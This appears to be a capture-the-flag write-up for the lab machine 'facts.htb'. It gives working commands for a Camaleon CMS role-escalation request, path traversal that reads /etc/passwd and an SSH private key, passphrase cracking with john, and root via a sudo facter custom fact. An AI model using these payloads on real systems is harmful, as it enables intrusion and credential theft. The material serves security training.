## Foothold

### CMS Identification

Registering an account at `http://facts.htb/admin/register` and browsing the admin panel reveals the CMS: **Camaleon CMS 2.9.0**.

This version is vulnerable to [CVE-2025-2304](https://nvd.nist.gov/vuln/detail/CVE-2025-2304) — a mass assignment privilege escalation. The update profile endpoint uses `permit!` without allowlisting, meaning arbitrary user attributes can be injected into the PATCH request.

### CVE-2025-2304 — Role Escalation

Intercept the profile update request and inject `password[role]=admin`:

```http
POST /admin/users/5/updated_ajax HTTP/1.1
Host: facts.htb
Content-Type: application/x-www-form-urlencoded

_method=patch&authenticity_token=...&password[password]=password&password[password_confirmation]=password&password[role]=admin
```

The response confirms the role was updated. We now have admin access.

### LFI via Private File Download

The admin media panel exposes a private file download endpoint:

```
GET /admin/media/download_private_file?file=<path>
```

Attempting path traversal confirms LFI is possible. Read `/etc/passwd`:

```bash
curl -b "$SESSION_COOKIE" \
  'http://facts.htb/admin/media/download_private_file?file=../../../../../../../etc/passwd'
```

Relevant users:
```
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

### SSH Key Retrieval

Fuzz for SSH private keys in `trivia`'s home using a [SSH key wordlist](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists):

```bash
ffuf -b "$SESSION_COOKIE" \
  -w ssh-priv-key-loot-common.txt \
  -fc 500 \
  -u 'http://facts.htb/admin/media/download_private_file?file=../../../../../../../home/trivia/.ssh/FUZZ'
# id_ed25519  [Status: 200, Size: 464]
```

Download the key:

```bash
curl -b "$SESSION_COOKIE" \
  'http://facts.htb/admin/media/download_private_file?file=../../../../../../../home/trivia/.ssh/id_ed25519' \
  -o id_ed25519
```

### Crack the Passphrase

```bash
ssh2john id_ed25519 > id_ed25519.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash
# dragonballz (id_ed25519)
```

## Root

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

`facter` can load custom Ruby facts from an arbitrary directory — exploit via [GTFOBins](https://gtfobins.github.io/gtfobins/facter/):

```bash
TF=$(mktemp -d)
echo 'Facter.add("x") { setcode { system("/bin/bash") } }' > $TF/x.rb
sudo facter --custom-dir=$TF x
```
